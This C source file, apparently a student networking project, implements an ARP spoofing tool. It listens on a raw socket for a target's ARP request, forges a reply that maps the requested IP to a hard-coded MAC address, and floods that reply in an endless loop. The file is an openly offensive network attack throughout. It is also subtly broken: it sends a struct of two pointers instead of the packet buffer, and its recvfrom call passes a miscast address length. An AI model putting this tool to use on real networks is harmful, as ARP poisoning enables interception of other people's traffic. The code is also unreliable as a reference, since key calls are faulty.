#include "ft_malcolm.h"

//#define BUFFER_SIZE 1514

char ip_address[16];

typedef struct s_arphdr {
    unsigned short int ar_hrd;      /* Type de matériel (ethernet, etc.) */
    unsigned short int ar_pro;      /* Type de protocole (IP, etc.) */
    unsigned char ar_hln;           /* Longueur de l'adresse matérielle */
    unsigned char ar_pln;           /* Longueur de l'adresse de protocole */
    unsigned short int ar_op;       /* Opération ARP (requête ou réponse) */
    unsigned char ar_sha[ETH_ALEN]; /* Adresse matérielle source */
    unsigned char ar_spa[4];        /* Adresse de protocole source */
    unsigned char ar_tha[ETH_ALEN]; /* Adresse matérielle de destination */
    unsigned char ar_tpa[4];        /* Adresse de protocole de destination */
}               t_arphdr;

typedef struct s_arp_packet{
    struct ether_header *ethhdr;
    t_arphdr *arphdr;
} t_arp_packet;

int hex_to_int(char hex_char) {
    if (hex_char >= '0' && hex_char <= '9') {
        return hex_char - '0';
    } else if (hex_char >= 'a' && hex_char <= 'f') {
        return hex_char - 'a' + 10;
    } else if (hex_char >= 'A' && hex_char <= 'F') {
        return hex_char - 'A' + 10;
    } else {
        return -1;  // Caractère invalide
    }
}

int atoi_hex(const char *hex_str) {
    int result = 0;
    while (*hex_str != '\0') {
        int digit = hex_to_int(*hex_str);
        if (digit == -1) {
            return -1;  // Caractère invalide
        }
        result = result * 16 + digit;
        hex_str++;
    }
    return result;
}

void	*ft_memcpy(void *dest, const void *src, size_t n)
{
	const char	*tmp;
	char		*fin;
	int			i;

	if (!dest && !src)
		return (NULL);
	tmp = (const char *)src;
	fin = (char *)dest;
	i = 0;
	while (n > 0)
	{
		fin[i] = tmp[i];
		i++;
		n--;
	}
	return (fin);
}

char *binary_to_string(in_addr_t ip_binary)
{
    sprintf(ip_address, "%d.%d.%d.%d", ip_binary & 0xFF,
            (ip_binary >> 8) & 0xFF,
            (ip_binary >> 16) & 0xFF,
            (ip_binary >> 24) & 0xFF
            );
    return ip_address;
}

char **free_tmp(char **str)
{
    int i = 0;
    while (str[i])
    {
        free(str[i]);
        i++;
    }
    free(str[i]);
    free(str);
    return NULL;
}

int get_interface_mac_address(char* if_name, unsigned char* mac_address) {
    struct ifreq ifr;
    int sock;

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, if_name, IFNAMSIZ - 1);

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return -1;
    }

    memcpy(mac_address, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    //printf("ya zeub %s\n", ifr.ifr_hwaddr.sa_data);
    close(sock);

    return 0;
}

int main(int argc, char **argv) 
{
    // if (getuid() != 0)
    // {
    //     printf("Usage: <%s> Please run as root\n", argv[0]);
    //     return 1;
    // }
    // if (argc != 5)
    // {
    //     printf("Usage: <%s> [source ip] [source mac address] [target ip] [target mac address]\n", argv[0]);
    //     return 1;
    // }
    
    int sockfd;
    char buffer[BUFFER_SIZE];
    ssize_t recv_len;
    //struct ether_header *ethhdr;
    //t_arphdr *arphdr;
    t_arp_packet response;
    struct sockaddr_ll saddr;
    in_addr_t src_ip, target_ip;
    struct in_addr src_ip_rec;
    struct in_addr dest_ip_rec;
    struct in_addr spoof;
    const char *ifname = "enp0s1";
    unsigned char mac_address_source[ETH_ALEN];
    //unsigned char mac_address_target[ETH_ALEN] = {0x16, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
    //unsigned char ip_address_source[4] = {192, 168, 1, 1};
    unsigned char ip_address_target[4];
    char mac_address_string[18] = "6a:bf:ac:21:ae:e5";
    unsigned char mac_address_target[ETH_ALEN];
    sscanf(mac_address_string, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
       &mac_address_target[0], &mac_address_target[1], &mac_address_target[2],
       &mac_address_target[3], &mac_address_target[4], &mac_address_target[5]);
    //mac_address_string[17] = '\0';
    //be:d0:74:e5:c6:64
    // sprintf(mac_address_target, "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
    //    &mac_address_string[0], &mac_address_string[1], &mac_address_string[2],
    //    &mac_address_string[3], &mac_address_string[4], &mac_address_string[5]);
    unsigned char mac_address[ETH_ALEN];
    char mac_address_string2[18] = "be:d0:74:e5:c6:64";
    sscanf(mac_address_string2, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
       &mac_address[0], &mac_address[1], &mac_address[2],
       &mac_address[3], &mac_address[4], &mac_address[5]);
    
    src_ip = inet_addr(argv[1]);
    target_ip = inet_addr(argv[3]);
    if (inet_aton("192.168.64.2", &spoof) == 0) {
        fprintf(stderr, "Erreur lors de la conversion de l'adresse IP\n");
        exit(EXIT_FAILURE);
    }

    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sockfd < 0) {
        perror("socket");
        return 1;
    }
    printf("Waiting arp request to spoof...\n");
    while(1) {
        recvfrom(sockfd, buffer, ETH_FRAME_LEN, 0, (struct sockaddr*)&saddr, (socklen_t*)sizeof(saddr));
        response.ethhdr = (struct ether_header *) buffer;
        response.arphdr = (t_arphdr *) (buffer + sizeof(struct ether_header));
        if(ntohs(response.ethhdr->ether_type) == ETHERTYPE_ARP && ntohs(response.arphdr->ar_op) == ARPOP_REQUEST) 
        {
            printf("Received ARP request\n");
            ft_memcpy(&src_ip_rec.s_addr, response.arphdr->ar_spa, sizeof(src_ip_rec.s_addr));
            ft_memcpy(&dest_ip_rec.s_addr, response.arphdr->ar_tpa, sizeof(dest_ip_rec.s_addr));
            if (target_ip == src_ip_rec.s_addr ){
                //printf("target ip = %d et src_ip = %d\n", target_ip , &src_ip_rec.s_addr);
                binary_to_string(dest_ip_rec.s_addr);
                printf("Source MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
                   response.ethhdr->ether_shost[0], response.ethhdr->ether_shost[1],
                   response.ethhdr->ether_shost[2], response.ethhdr->ether_shost[3],
                   response.ethhdr->ether_shost[4], response.ethhdr->ether_shost[5]);
                printf("dest MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
                   response.ethhdr->ether_dhost[0], response.ethhdr->ether_dhost[1],
                   response.ethhdr->ether_dhost[2], response.ethhdr->ether_dhost[3],
                   response.ethhdr->ether_dhost[4], response.ethhdr->ether_dhost[5]);
                printf("Source IP address: %s\nTarget IP address: %s\n", ip_address ,argv[3]);
                printf("---------------\n\n");
                printf("ARP Request:\n");
                printf("Hardware type: %d\n", ntohs(*(unsigned short *)(buffer + sizeof(struct ether_header))));
                printf("Protocol type: %d\n", ntohs(*(unsigned short *)(buffer + sizeof(struct ether_header) + 2)));
                printf("Hardware address length: %d\n", *(unsigned char *)(buffer + sizeof(struct ether_header) + 4));
                printf("Protocol address length: %d\n", *(unsigned char *)(buffer + sizeof(struct ether_header) + 5));
                printf("Opcode: %d\n", ntohs(*(unsigned short *)(buffer + sizeof(struct ether_header) + 6)));
                //printf("Source MAC address: %s\n", ether_ntoa((struct ether_addr *)(buffer + sizeof(struct ether_header) + 8)));
                printf("Source MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
                   *(unsigned char *)(buffer + sizeof(struct ether_header) + 8), *(unsigned char *)(buffer + sizeof(struct ether_header) + 9),
                   *(unsigned char *)(buffer + sizeof(struct ether_header) + 10), *(unsigned char *)(buffer + sizeof(struct ether_header) + 11),
                   *(unsigned char *)(buffer + sizeof(struct ether_header) + 12), *(unsigned char *)(buffer + sizeof(struct ether_header) + 13));
                printf("Source IP address: %s\n", inet_ntoa(*(struct in_addr *)(buffer + sizeof(struct ether_header) + 14)));
                //printf("Target MAC address: %s\n", ether_ntoa((struct ether_addr *)(buffer + sizeof(struct ether_header) + 18)));
                printf("dest MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
                   *(unsigned char *)(buffer + sizeof(struct ether_header) + 18), *(unsigned char *)(buffer + sizeof(struct ether_header) + 19),
                   *(unsigned char *)(buffer + sizeof(struct ether_header) + 20), *(unsigned char *)(buffer + sizeof(struct ether_header) + 21),
                   *(unsigned char *)(buffer + sizeof(struct ether_header) + 22), *(unsigned char *)(buffer + sizeof(struct ether_header) + 23));
                printf("Target IP address: %s\n", inet_ntoa(*(struct in_addr *)(buffer + sizeof(struct ether_header) + 24)));
                printf("Ethernet Header:\n");
                printf("  Destination MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n", response.ethhdr->ether_dhost[0], response.ethhdr->ether_dhost[1], response.ethhdr->ether_dhost[2], response.ethhdr->ether_dhost[3], response.ethhdr->ether_dhost[4], response.ethhdr->ether_dhost[5]);
                printf("  Source MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n", response.ethhdr->ether_shost[0], response.ethhdr->ether_shost[1], response.ethhdr->ether_shost[2], response.ethhdr->ether_shost[3], response.ethhdr->ether_shost[4], response.ethhdr->ether_shost[5]);
                printf("  Ether type: %hu\n", response.ethhdr->ether_type);
                printf("SLL Header:\n");
                printf("Family: %hu\n", saddr.sll_family);
                printf("Interface index: %d\n", saddr.sll_ifindex);
                printf("Protocol: %hu\n", ntohs(saddr.sll_protocol));
                printf("Address length: %hhu\n", saddr.sll_halen);
                printf("Address ssl: %02x:%02x:%02x:%02x:%02x:%02x\n",
                        saddr.sll_addr[0], saddr.sll_addr[1], saddr.sll_addr[2],
                        saddr.sll_addr[3], saddr.sll_addr[4], saddr.sll_addr[5]);
                printf("\n---------------\n\n");
                break;
            }
        }
    }
    //response
    
    
    // char **tmp = ft_split(argv[2], ':');
    // sprintf(mac_address_source, "%02x:%02x:%02x:%02x:%02x:%02x",
    //        atoi_hex(tmp[0]), atoi_hex(tmp[1]), atoi_hex(tmp[2]),atoi_hex(tmp[3]), atoi_hex(tmp[4]), atoi_hex(tmp[5]));
    
    // tmp = free_tmp(tmp);
    // tmp = ft_split(argv[4], ':');
    // sprintf(mac_address_target, "%02x:%02x:%02x:%02x:%02x:%02x",
    //        atoi_hex(tmp[0]), atoi_hex(tmp[1]), atoi_hex(tmp[2]),atoi_hex(tmp[3]), atoi_hex(tmp[4]), atoi_hex(tmp[5]));
    
    // tmp = free_tmp(tmp);
    // tmp = ft_split(argv[1], '.');
    // sprintf(ip_address_source, "%s.%s.%s.%s",
    //        tmp[0], tmp[1], tmp[2],tmp[3]);
    
    // tmp = free_tmp(tmp);
    // tmp = ft_split(argv[3], '.');
    // sprintf(ip_address_target, "%s.%s.%s.%s",
    //        tmp[0], tmp[1], tmp[2],tmp[3]);
    
    // tmp = free_tmp(tmp);
    ft_memcpy(response.arphdr->ar_tha, response.ethhdr->ether_shost, ETH_ALEN);
    memcpy(saddr.sll_addr, mac_address_target, ETH_ALEN);
    
    response.arphdr->ar_hrd = htons(ARPHRD_ETHER);
    response.arphdr->ar_pro = htons(ETH_P_IP);
    response.arphdr->ar_hln = 6;
    response.arphdr->ar_pln = 4;
    response.arphdr->ar_op = htons(2);
    // ft_memcpy(response.arphdr->ar_sha, mac_address_source, ETH_ALEN);
    char ip_address[INET_ADDRSTRLEN];
    int status;
    struct addrinfo hints, *res;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET; // Utiliser IPv4
    hints.ai_socktype = SOCK_DGRAM;

   

    ft_memcpy(response.arphdr->ar_sha, mac_address_target, ETH_ALEN);
    ft_memcpy(response.ethhdr->ether_dhost, response.ethhdr->ether_shost, ETH_ALEN);
    ft_memcpy(response.ethhdr->ether_shost, mac_address_target, ETH_ALEN);
    ft_memcpy(response.arphdr->ar_spa, &dest_ip_rec.s_addr, 4);
    ft_memcpy(response.arphdr->ar_tpa, &src_ip_rec.s_addr, 4);
    response.ethhdr->ether_type = htons(ETH_P_ARP);
    printf("ARP Header:\n");
    printf("Hardware type: %u\n", ntohs(response.arphdr->ar_hrd));
    printf("Protocol type: %u\n", ntohs(response.arphdr->ar_pro));
    printf("Hardware address length: %u\n", response.arphdr->ar_hln);
    printf("Protocol address length: %u\n", response.arphdr->ar_pln);
    printf("Opcode: %u\n", ntohs(response.arphdr->ar_op));
    printf("Adresse MAC source : %02x:%02x:%02x:%02x:%02x:%02x\n", response.arphdr->ar_sha[0], response.arphdr->ar_sha[1], response.arphdr->ar_sha[2], response.arphdr->ar_sha[3], response.arphdr->ar_sha[4], response.arphdr->ar_sha[5]);
    printf("Adresse IP source : %d.%d.%d.%d\n", response.arphdr->ar_spa[0], response.arphdr->ar_spa[1], response.arphdr->ar_spa[2], response.arphdr->ar_spa[3]);
    printf("Adresse MAC target : %02x:%02x:%02x:%02x:%02x:%02x\n", response.arphdr->ar_tha[0], response.arphdr->ar_tha[1], response.arphdr->ar_tha[2], response.arphdr->ar_tha[3], response.arphdr->ar_tha[4], response.arphdr->ar_tha[5]);
    printf("Adresse IP target : %d.%d.%d.%d\n", response.arphdr->ar_tpa[0], response.arphdr->ar_tpa[1], response.arphdr->ar_tpa[2], response.arphdr->ar_tpa[3]);
    
    int if_index;
    if_index = if_nametoindex("enp0s1");
    saddr.sll_family = AF_PACKET;
    saddr.sll_ifindex = if_index;
    saddr.sll_protocol = htons(ETH_P_ARP);
    saddr.sll_pkttype = PACKET_OTHERHOST;
    saddr.sll_hatype = ARPHRD_ETHER;
    saddr.sll_halen = ETH_ALEN;
    printf("SLL Header:\n");
    printf("Family: %hu\n", saddr.sll_family);
    printf("Interface index: %d\n", saddr.sll_ifindex);
    printf("Protocol: %hu\n", ntohs(saddr.sll_protocol));
    printf("Address length: %hhu\n", saddr.sll_halen);
    printf("Address ssl: %02x:%02x:%02x:%02x:%02x:%02x\n",
            saddr.sll_addr[0], saddr.sll_addr[1], saddr.sll_addr[2],
            saddr.sll_addr[3], saddr.sll_addr[4], saddr.sll_addr[5]);

    printf("eth dest address: %02x:%02x:%02x:%02x:%02x:%02x\n",
                   response.ethhdr->ether_dhost[0], response.ethhdr->ether_dhost[1],
                   response.ethhdr->ether_dhost[2], response.ethhdr->ether_dhost[3],
                   response.ethhdr->ether_dhost[4], response.ethhdr->ether_dhost[5]);

    printf("eth src address: %02x:%02x:%02x:%02x:%02x:%02x\n",
                   response.ethhdr->ether_shost[0], response.ethhdr->ether_shost[1],
                   response.ethhdr->ether_shost[2], response.ethhdr->ether_shost[3],
                   response.ethhdr->ether_shost[4], response.ethhdr->ether_shost[5]);
    while (1)
    {    
        if (sendto(sockfd, &response, sizeof(t_arp_packet), 0, (struct sockaddr *) &saddr, sizeof(saddr)) < 0) {
            perror("Erreur lors de l'envoi de la requête ARP");
            exit(EXIT_FAILURE);
        }
        usleep(10);
    }
    close(sockfd);
    return 0;
}